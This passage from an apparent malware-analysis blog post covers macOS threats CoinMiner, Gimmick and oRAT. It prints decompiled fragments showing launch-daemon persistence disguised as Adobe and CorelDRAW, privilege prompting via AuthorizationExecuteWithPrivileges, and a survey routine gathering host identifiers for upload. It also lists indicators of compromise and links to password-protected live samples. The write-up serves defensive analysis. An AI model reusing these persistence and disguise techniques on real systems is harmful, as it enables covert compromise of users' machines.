<p>Still the user is expecting Zii to run, hence it makes sense for the malware to launch it, such that nothing appears amiss.</p>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Daemon</span>
</p>
<p>The same binary, <code>lauth</code> also persists the malware via a launch daemon: <code> /Library/LaunchDaemons/com.adobe.acc.installer.v1.plist</code>.</p>
<p>In order to install a launch daemon, one much have root privileges. Easy enough, the parent process of <code>lauth</code> (which presumably is run by the user as the main binary on the infected disk image) simply asks the user via the <code>AuthorizationExecuteWithPrivileges</code> API.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(...) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    fwrite(__lauth, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0xd03c70</span>, fopen(<span style="color:#e6db74">&#34;/tmp/lauth&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>));
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    system(<span style="color:#e6db74">&#34;chmod +x /tmp/lauth&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    AuthorizationCreate(<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#f92672">&amp;</span>var_40);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    AuthorizationExecuteWithPrivileges(var_40, <span style="color:#e6db74">&#34;/tmp/lauth&#34;</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#f92672">&amp;</span>var_30, <span style="color:#f92672">&amp;</span>var_38);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>}</span></span></code></pre></div>
<p>Invoking the <code>AuthorizationExecuteWithPrivileges</code> API will result in a password prompt, and if the user enters the appropriate credentials will execute a specified (here the <code>lauth</code> binary) will elevated privileges.</p>
<p>With such elevated privileges, the malware can now persist as launch daemon.</p>
<p>Back to the disassembly of the <code>lauth</code> binary, we find an embedded launch item property list:</p>
<img src="../images/blog/blog_0x71/cmPlist.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Embedded Launch Item Plist</center>

<p>The malware will write this embedded property list to <code>/Library/LaunchDaemons/com.adobe.acc.installer.v1.plist</code> and then launch it (via <code>launchctl load</code>&hellip;as shown in the following disassembly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(...) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    fopen(<span style="color:#e6db74">&#34;/Library/LaunchDaemons/com.adobe.acc.installer.v1.plist&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>));
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    fwrite(<span style="color:#e6db74">&#34;&lt;?xml version=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">1.0</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> encoding=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">UTF-8</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">?&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!DOCTYPE plist PUBLIC ...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>            <span style="color:#e6db74">&#34;&lt;plist version=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">1.0</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;dict&gt;</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&lt;key&gt;Label&lt;/key&gt;</span><span style="color:#ae81ff">\n\t</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            <span style="color:#e6db74">&#34;&lt;string&gt;com.adobe.acc.installer.v1&lt;/string&gt;</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&lt;key&gt;ProgramArguments‚Ä¶&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    system(<span style="color:#e6db74">&#34;launchctl load /Library/LaunchDaemons/com.adobe.acc.installer.v1.plist&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>}</span></span></code></pre></div>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code>, the persisted item <code>/usr/local/bin/com.adobe.acc.installer.v1</code> will be (re)executed each time the infected system is rebooted.</p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Crypto-Currency Miner
</span>
</p>
<p><code>CoinMiner</code> main (and only?) objective is to surreptitiously mine crypto-currency. This is accomplished by executing a binary (it has installed) named <code>com.adobe.acc.localhost</code>. (This binary is spawned by the launch daemon&rsquo;s binary: <code>/usr/local/bin/com.adobe.acc.installer.v1</code>).</p>
<p>The TrendMicro report explains that the <code>com.adobe.acc.localhost</code> binary is simply, &ldquo;modified [open-source] XMRig command-line [miner] app&rdquo;. This can be confirmed (as they note), by executing it with the <code>--help</code> commandline option:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% ./com.adobe.acc.localhost --help
Usage: xmrig [OPTIONS]
Options:
  -a, --algo=ALGO          specify the algorithm to use
                             cryptonight
                             cryptonight-lite
                             cryptonight-heavy
  -o, --url=URL            URL of mining server
  -O, --userpass=U:P       username:password pair for mining server
  -u, --user=USERNAME      username for mining server
  -p, --pass=PASSWORD      password for mining server
      --rig-id=ID          rig identifier for pool-side statistics (needs pool support)
  -t, --threads=N          number of miner threads
</pre>
</div>
<p>Configuration information for miner can be found (as pointed out by the TrendMicro researchers) embedded within the <code>com.adobe.acc.localhost</code> binary:</p>
<img src="../images/blog/blog_0x71/cmConfig.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Embedded Miner Configuration</center>

<p>This configuration includes the url of the miner server, user name and password:</p>
<ul>
<li><code>url: 127.0.0.1:4545</code></li>
<li><code>user: pshp</code></li>
<li><code>password: x</code></li>
</ul>
<p>A localhost (<code>127.0.0.1</code>) address for the mining server seems strange, and until we realize that malware installs a I2P listener on localhost, port <code>4545</code></p>
<div class="note">
Regarding I2P, Wikipedia notes that,
<p>&ldquo;The Invisible Internet Project (I2P) is an anonymous network layer that allows for censorship-resistant, peer-to-peer communication.&rdquo;</p>
</div>
<p>Via macOS built-in <code>lsof</code> command you can see the listener on port <code>4545</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% lsof -i -P -n
COMMAND    PID USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
...
com.adobe 2844 user   11u  IPv4       0t0  TCP *:15899 (LISTEN)
com.adobe 2844 user   23u  IPv4       0t0  UDP *:15899
<b>com.adobe 2844 user   30u  IPv4       0t0  TCP 127.0.0.1:4545 (LISTEN)</b>
</pre>
</div>
<p>As TrendMicro notes,</p>
<blockquote>
"We can conclude that the XMRig traffic to 127.0.0.1:4545 will be tunneled by i2pd to [and IP2 endpoint]." 
...
-TrendMicro
</blockquote>
<p>&hellip;and why use I2P?, rather simply as the TrendMicro researchers state, &ldquo;to hide its network traffic from the untrained eye.&rdquo;
<br></p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>There are a myriad of samples (and thus IoCs) for <code>CoinMiner</code>.</p>
<p>TrendMicro, has <a href="https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network/IOCs-Mac%20Coinminer.txt">published a file</a> solely containing such IoCs, which should be consulted. However, we list a few here (credit: TrendMicro):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li>
<p><code>/tmp/lauth</code>: <br>
<code>fe3700a52e86e250a9f38b7a5a48397196e7832fd848a7da3cc02fe52f49cdcf</code></p>
</li>
<li>
<p><code>/usr/local/bin/com.adobe.acc.localhost</code>: <br>
<code>fabe0b41fb5bce6bda8812197ffd74571fc9e8a5a51767bcceef37458e809c5c</code></p>
</li>
<li>
<p><code>/usr/local/bin/com.adobe.acc.network</code>: <br>
<code>a2909754783bb5c4fd6955bcebc356e9d6eda94f298ed3e66c7e13511275fbc4</code></p>
</li>
</ul>
</li>
<li>
<p>Files/Directories:</p>
<ul>
<li><code>/Library/LaunchDaemons/com.adobe.acc.installer.v1.plist</code></li>
</ul>
</li>
</ul>
<br>
<h3 id="-gimmick">üëæ <strong><code>Gimmick</code></strong></h3>
<div class="note">
<p>A multi-platform implant, leveraging cloud providers for command &amp; control.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/Gimmick.zip"><code>Gimmick</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In March, Volexity <a href="https://www.volexity.com/blog/2022/03/22/storm-cloud-on-the-horizon-gimmick-malware-strikes-at-macos/">published a write-up</a> on their discover and analysis of <code>Gimmick</code>, noting:</p>
<blockquote>
"GIMMICK is used in targeted attacks by Storm Cloud, a Chinese espionage threat actor known to attack organizations across Asia. It is a feature-rich, multi-platform malware family that uses public cloud hosting services (such as Google Drive) for command-and-control (C2) channels." -Volexity
</blockquote>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>&ldquo;<a href="https://www.volexity.com/blog/2022/03/22/storm-cloud-on-the-horizon-gimmick-malware-strikes-at-macos/">Storm Cloud on the Horizon: GIMMICK Malware Strikes at macOS</a>&rdquo;</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Unknown</span></p>
<p>Volexity discovered the macOS version of <code>Gimmick</code> via unauthorized network traffic.</p>
<blockquote>
"...this traffic was determined to be unauthorized and the system, a MacBook Pro running macOS 11.6 (Big Sur)...This led to the discovery of a macOS variant of a malware implant Volexity calls GIMMICK" -Volexity
</blockquote>
<p>At this time however, it is unknown how <code>Gimmick</code> initially infects macOS systems.
<br></p>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Item</span>
</p>
<p>In terms of persistence, the <code>Gimmick</code> will either persist as a launch daemon or agent. Interestingly the malware display some simple variability, with Volexity noting that &ldquo;The name of the binary, plist, and agent will vary per sample&rdquo;.</p>
<p>However perusing the malware&rsquo;s disassembly we find a hardcod path for both a launch daemon and agent: <code>com.CorelDRAW.va.plist</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_1000299dd</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  sub_10002939e(arg0, <span style="color:#e6db74">&#34;/Library/LaunchDaemons/com.CorelDRAW.va.plist&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  <span style="color:#66d9ef">if</span> (getuid() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    rax <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>basic_string(<span style="color:#f92672">&amp;</span>var_50, <span style="color:#e6db74">&#34;/Users/&#34;</span>, <span style="color:#f92672">&amp;</span>var_68);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    rax <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">::</span>append(<span style="color:#f92672">&amp;</span>var_50, 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>            <span style="color:#e6db74">&#34;/Library/LaunchAgents/com.CorelDRAW.va.plist&#34;</span>);</span></span></code></pre></div>
<p>Depending on the malware permissions (determined in the above disassembly via: <code>getuid() != 0x0</code>), it will either persist as launch daemon or launch agent.</p>
<p>If we run the malware in a isolated virtual machine, our <a href="https://objective-see.com/products/utilities.html#FileMonitor"><code>FileMonitor</code></a> observes the creation of the launch item:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_WRITE",
  "file" : {
    "destination" : "/Library/LaunchDaemons/com.CorelDRAW.va.plist",
    "process" : {
      "signing info (computed)" : {
        "signatureStatus" : 0,
        "signatureSigner" : "AdHoc",
        "signatureID" : "mac_g-55554944f9d2f6db7ac23aaea93cad4f3d707ec4"
      },
      "uid" : 0,
      "arguments" : [

      ],
      "ppid" : 613,
      "ancestors" : [
        401,
        1
      ],
      "rpid" : 401,
      "architecture" : "Apple Silicon",
      "path" : "/Users/user/Downloads/gimmick",
      "signing info (reported)" : {
        "teamID" : "",
        "csFlags" : 570425347,
        "signingID" : "mac_g-55554944f9d2f6db7ac23aaea93cad4f3d707ec4",
        "platformBinary" : 0,
        "cdHash" : "69051425DFC9405E7130968AD471CA578F39BF55"
      },
      "name" : "gimmick",
      "pid" : 615
    }
  }
}
</pre>
</div>
<p>Once the malware has written out the launch daemon plist, <code>com.CorelDRAW.va.plist</code>, we can dump its contents:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% cat /Library/LaunchDaemons/com.CorelDRAW.va.plist
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC ...PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
  &lt;key&gt;Label&lt;/key&gt;
  &lt;string&gt;com.CorelDRAW.va.plist&lt;/string&gt;
  &lt;key&gt;ProgramArguments&lt;/key&gt;
  &lt;array&gt;
    &lt;string&gt;/var/root/Library/Preferences/CorelDRAW/CorelDRAW&lt;/string&gt;
  &lt;/array&gt;
  &lt;key&gt;RunAtLoad&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;StartInterval&lt;/key&gt;
  &lt;integer&gt;30&lt;/integer&gt;
  &lt;key&gt;ThrottleInterval&lt;/key&gt;
  &lt;integer&gt;2&lt;/integer&gt;
  &lt;key&gt;WorkingDirectory&lt;/key&gt;
  &lt;string&gt;/var/root/Library/Preferences/CorelDRAW&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</pre>
</div>
<p>The persisted binary <code>/var/root/Library/Preferences/CorelDRAW/CorelDRAW</code> is simply a copy of the malware.</p>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code>, macOS will automatically start the malware (now named <code>CorelDRAW</code>).</p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Backdoor
</span>
</p>
<p><code>Gimmick</code> is rather large, complex, and interestingly as noted by Volexity leverages &ldquo;cloud platforms for C2, such as using Google Drive, [which] increases the likelihood of operating undetected by network monitoring solutions&rdquo;</p>
<p>&hellip;but at it&rsquo;s core, its capabilities are rather simple, albeit sufficient to afford a remote attacker full (remote) control over an infected system. These capabilities (taskable from its cloud-based command &amp; control server) include:</p>
<ul style="list-style-type:square;">
  <li>Survey (and post results to server)</li>
  <li>Upload file to server</li>
  <li>Download file to infected system</li>
  <li>Execute a command (and post results to server)</li>
</ul>
<p>The Volexity report also mentions several other taskable commands related configuring various command &amp; control related timers.</p>
<p>Let&rsquo;s take a closer look at one of these commands, specifically the survey &hellip;which is also directly executed when the malware starts up. (We&rsquo;ll follow the invocation of the survey logic from malware&rsquo;s entry point as that&rsquo;s a simpler control flow path).</p>
<p>Starting at the malware&rsquo;s entry point, we find the rather verbose code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>r14 <span style="color:#f92672">=</span> dispatch_queue_create(<span style="color:#e6db74">&#34;SendBaseinfoQueue&#34;</span>, <span style="color:#f92672">*</span>__dispatch_queue_attr_concurrent);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>            
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>rbx <span style="color:#f92672">=</span> [[GCDTimerManager sharedInstance] retain];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>[rbx scheduleGCDTimerWithName:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;send_cmd_baseinfo&#34;</span> interval:r14 queue:<span style="color:#ae81ff">0x1</span> repeats:<span style="color:#ae81ff">0x0</span> option:<span style="color:#f92672">^</span> {<span style="color:#75715e">/* block implemented at sub_100002381 */</span> } } action:stack[<span style="color:#f92672">-</span><span style="color:#ae81ff">1120</span>]];</span></span></code></pre></div>
<p>Based on the queue name (<code>SendBaseinfoQueue</code>) and GCD Timer name (<code>send_cmd_baseinfo</code>), safe to assume this is kicking off the &ldquo;survey and post to server&rdquo; logic. Let&rsquo;s dig deeper, looking into the block (<code>sub_100002381</code>) that is invoked.</p>
<p>A quick peek reveals it simply calls a unnamed subroutine (<code>sub_10000c64a</code>) that is responsible for generating the survey and trigger the upload logic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_10000c64a</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    var_38 <span style="color:#f92672">=</span> [[CDDSMacBaseInfo getHardwareUUID] retain];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    var_30 <span style="color:#f92672">=</span> [[CDDSMacBaseInfo getMacaddress] retain];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    r12 <span style="color:#f92672">=</span> [[NSString stringWithUTF8String:[CDDSMacBaseInfo GetCpuInfoAndModel]] retain];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    r13 <span style="color:#f92672">=</span> [[CDDSMacBaseInfo getSystemVersion] retain];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    rax <span style="color:#f92672">=</span> [NSMutableDictionary dictionary];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    [rax setObject:var_38 forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;uuid&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    [rax setObject:var_30 forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;mac&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    [rax setObject:r13 forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;sysname&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    [rax setObject:r12 forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;cpu&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    rax <span style="color:#f92672">=</span> sub_10000c836(rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    [FileManager writeCmdJsonFeedback:rax jsonType:<span style="color:#ae81ff">0x0</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>}</span></span></code></pre></div>
<p>Thanks to the verbosity of the method names (e.g. <code>getMacaddress</code>) as well as the keynames (e.g. <code>mac</code>), it&rsquo;s pretty easy to understand exactly what the survey entails.</p>
<p>And once the survey has been generated its stored (via a call to: <code>FileManager writeCmdJsonFeedback:...</code>), pending upload to the cloud-based server.</p>
<p>Lets watch the malware survey an (infected) vm, via a debugger &hellip;by setting a breakpoint right after the survey dictionary has been populated.</p>
<p>As the (now populated) dictionary is found in the $rax register, we can dump it via the <code>print object $rax</code> command:</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# lldb /var/root/Library/Preferences/CorelDRAW/CorelDRAW
...

(lldb) print object $rax
{
    cpu = "MacBookAir10,1";
    mac = "50-ED-3C-14-49-2F";
    sysname = "Version 12.6.1 (Build 21G217)";
    uuid = "B27B4042-D513-50C3-9E1D-D4FC54FA7952";
}
</pre>
</div>
<br></p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>Gimmick</code> include the following (credit: Volexity):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>/var/root/Library/Preferences/CorelDRAW/CorelDRAW</code>: <br>
<code>2a9296ac999e78f6c0bee8aca8bfa4d4638aa30d9c8ccc65124b1cbfc9caab5f</code></li>
</ul>
</li>
<li>
<p>Files/Directories:</p>
<ul>
<li><code>/var/root/Library/Preferences/CorelDRAW/</code></li>
<li><code>/Library/LaunchDaemons/com.CorelDRAW.va.plist</code></li>
</ul>
</li>
</ul>
<p>Volexity also <a href="https://github.com/volexity/threat-intel/blob/main/2022/2022-03-22%20GIMMICK/indicators/yara.yar">published a list of yara rules</a> to detect <code>Gimmick</code>.</p>
<br>
<h3 id="-orat">üëæ <strong><code>oRAT</code></strong></h3>
<div class="note">
<p>Belonging to a new APT group, oRAT macOS implant supports a myriad of features and capabilities.</p>
 <p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/oRAT.zip"><code>oRAT</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In April, TrendMicro researchers <a href="https://www.trendmicro.com/en_us/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html">published a write-up</a> details on a new APT group they dubbed &ldquo;Earth Berberoka&rdquo; &hellip;as well as details on new persistent macOS implant named <code>oRAT</code>, written in Go:</p>
<p><img src="../images/blog/blog_0x71/oRAT.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">oRAT uncovered by TrendMicro</center>

<br></p>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p>&ldquo;<a href="https://speakerdeck.com/patrickwardle/making-orat-go">Making oRAT Go</a>&rdquo;</p>
</li>
<li>
<p>&ldquo;<a href="https://www.trendmicro.com/en_us/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html">New APT Group Earth Berberoka Targets Gambling Websites With Old and New Malware</a>&rdquo;</p>
</li>
<li>
